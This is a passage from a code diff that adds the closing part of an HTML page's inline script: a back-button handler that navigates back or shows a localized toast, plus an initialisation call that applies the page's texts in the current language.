+            if (history.length > 1) history.back();
+            else showToast(TEXTS[currentLang].backMsg);
+        });
+
+        // =======================
+        // INIT
+        // =======================
+        applyTexts(currentLang);
+    </script>
 </body>
 
 </html>
